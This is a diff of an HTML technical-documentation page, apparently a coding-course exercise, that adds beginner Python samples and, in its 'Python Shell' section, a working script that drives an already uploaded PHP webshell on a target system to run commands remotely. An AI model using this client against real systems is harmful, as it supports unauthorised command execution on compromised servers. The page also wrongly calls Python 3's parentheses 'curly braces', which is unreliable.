@@ -2,7 +2,7 @@
 <html>
 	<head> 
 		<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-		<title>My product page</title>
+		<title>Technical Documentation page</title>
 		<link rel="stylesheet" href="style.css">
 		<style>
 			@media (max-width: 400px) { 
@@ -14,7 +14,6 @@
 	</head>
 	<body>
         <script src="https://cdn.freecodecamp.org/testable-projects-fcc/v1/bundle.js"></script>
-        <div id="container">
         <nav id="navbar" class="nav">
             <header>Technical Documentation</header>
             <a href="#Python" class="nav-link">Python</a>
@@ -22,7 +21,7 @@
             <a href="#Python_helloworld" class="nav-link">Python HelloWorld</a>
             <a href="#Python_ifconfig" class="nav-link">Python ifconfig</a>
             <a href="#Python_shell" class="nav-link">Python Shell</a>
-            <a href="../index.html" class="return-link">Back to main page</a>
+            <a href="../" class="return-link">Back to main page</a>
         </nav>
         <main id="main-doc">
             <section id="Python" class="main-section">
@@ -32,26 +31,25 @@
                 one should always be aware of the differences between the now deprecated Python version 2 and 
                 version 3.</p>
                 <code>$ python --version
-                    Python 2.7.16</code>
+Python 2.7.16</code>
                 <p>the version can simply be identified by using the --version tag on the commandline</p>
                 <code>$ python3 --version
-                    Python 3.7.3</code>
+Python 3.7.3</code>
                 <p>On some newer systems however, the 'python' command is already linked to version 3 by default.</p>
                 <p>Various other things you can find on this page as listed below here</p>
                 <ul>
                     <li>Some main info (this section)</li>
+                    <li>an introduction into the code samples displayed</li>
                     <li>How to print Hello, World! in both Python 2 and 3</li>
                     <li>How to obtain IP information (ifconfig) in python3</li>
-                    <li></li>
-                    <li>A short summary</li>
+                    <li>A Python based shell</li>
                 </ul>
             </section>
             <section id="Python_Code_Examples" class="main-section">
                 <header id="Python">Python Code Examples</header>
                 <a id="Python_Code_Examples"></a>
                 <p>With python, lots of fun things can be done. such as the default 'Hello, World!' example</p>
-                
-                
+                <p>This section contains various code samples as stated above. Each of these samples can be used freely.</p>     
             </section>
             <section id="Python_helloworld" class="main-section">
                 <header id="Python">Python HelloWorld</header>
@@ -60,37 +58,43 @@
                 <code>print "Hello, World!"</code>
                 <p>And in Python 3, you need to add curly braces.</p>
                 <code>print("Hello, World!")</code>
-                
             </section>
             <section id="Python_ifconfig" class="main-section">
                 <header id="Python">Python ifconfig</header>
                 <a id="Python_ifconfig"></a>
-                <p></p>
-                <code></code>
-                <p></p>
+                <p>With python, it is quite simple to obtain the IP address of the local system.</p>
+                <code>import socket
+socket.gethostbyname(socket.gethostname())</code>
+                <p>by using the socket module, all you need is the system's hostname which you can obtain using the same module.</p>
             </section>
             <section id="Python_shell" class="main-section">
                 <header id="Python">Python Shell</header>
                 <a id="Python_shell"></a>
-                <p></p>
-                <code></code>
-                <p></p>
+                <p>if a webshell has been uploaded to a target system (i.e. a php webshell), the following code can be used to simulate a more-or-less interactive shell.</p>
+                <code>#!/usr/bin/env python3
+import requests 
+import argparse
+from urllib.parse import quote
+from cmd import Cmd
+
+parser = argparse.ArgumentParser()
+parser.add_argument("-t","--target", help="provide the exact url location of the webshell i.e. http://&lt;host&gt;/shell.php?cmd=", required=True)
+cmdargs = parser.parse_args()
+
+class Terminal(Cmd):
+def __init__(self):
+self.prompt = "shell> "
+Cmd.__init__(self)
+
+def default(self, args):
+r = requests.post(cmdargs.target + quote(args)) 
+print(r.text)
+
+terminal = Terminal()
+terminal.cmdloop()</code>
+                <p>Althought some commands will not work, such as 'cd' to change directories, this makes it much easier to use a webshell.</p>
             </section>
 
         </main>
-    </div>
 </body>
-</html>
-
-
-
-
-
-
-
-
-
-
-
-    </body>
 </html>
